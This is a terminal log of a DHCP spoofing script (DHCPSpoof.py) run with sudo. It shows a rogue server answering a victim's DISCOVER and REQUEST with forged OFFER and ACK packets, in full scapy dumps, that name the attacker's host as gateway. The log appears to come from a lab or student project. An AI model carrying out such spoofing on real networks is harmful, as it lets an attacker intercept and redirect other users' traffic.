afsara@afsara-Inspiron-5559:~/DHCP-spoofing$ sudo python DHCPSpoof.py -i wlp2s0
************* Waiting for a DISCOVER ************* 
[*] Got dhcp DISCOVER from: ac:c1:ee:f4:06:42 xid: 0x41f24a43
[*] Sending OFFER...
***** CREATING DHCP OFFER PCKT *****
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = e4:02:9b:9f:ca:6d
  type      = 0x800
###[ IP ]### 
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = None
     src       = 192.168.0.105
     dst       = 255.255.255.255
     \options   \
###[ UDP ]### 
        sport     = bootps
        dport     = bootpc
        len       = None
        chksum    = None
###[ BOOTP ]### 
           op        = BOOTREPLY
           htype     = 1
           hlen      = 6
           hops      = 0
           xid       = 1106397763
           secs      = 0
           flags     = 
           ciaddr    = 0.0.0.0
           yiaddr    = 192.168.1.4
           siaddr    = 192.168.0.105
           giaddr    = 0.0.0.0
           chaddr    = '\xac\xc1\xee\xf4\x06B'
           sname     = ''
           file      = ''
           options   = 'c\x82Sc'
###[ DHCP options ]### 
              options   = [message-type='offer' server_id=192.168.0.105 subnet_mask=255.255.255.0 router=192.168.0.105 lease_time=172800 renewal_time=86400 rebinding_time=138240 end]

None
.
Sent 1 packets.
[*] Got dhcp REQUEST from: ac:c1:ee:f4:06:42 xid: 0x41f24a43
[*] Sending ACK...
***** CREATING DHCP ACK PCKT *****
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = e4:02:9b:9f:ca:6d
  type      = 0x800
###[ IP ]### 
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = None
     src       = 192.168.0.105
     dst       = 255.255.255.255
     \options   \
###[ UDP ]### 
        sport     = bootps
        dport     = bootpc
        len       = None
        chksum    = None
###[ BOOTP ]### 
           op        = BOOTREPLY
           htype     = 1
           hlen      = 6
           hops      = 0
           xid       = 1106397763
           secs      = 0
           flags     = 
           ciaddr    = 0.0.0.0
           yiaddr    = 192.168.1.4
           siaddr    = 192.168.0.105
           giaddr    = 0.0.0.0
           chaddr    = '\xac\xc1\xee\xf4\x06B'
           sname     = ''
           file      = ''
           options   = 'c\x82Sc'
###[ DHCP options ]### 
              options   = [message-type='ack' server_id=192.168.0.105 subnet_mask=255.255.255.0 router=192.168.0.105 lease_time=172800 renewal_time=86400 rebinding_time=138240 end]

None
.
Sent 1 packets.
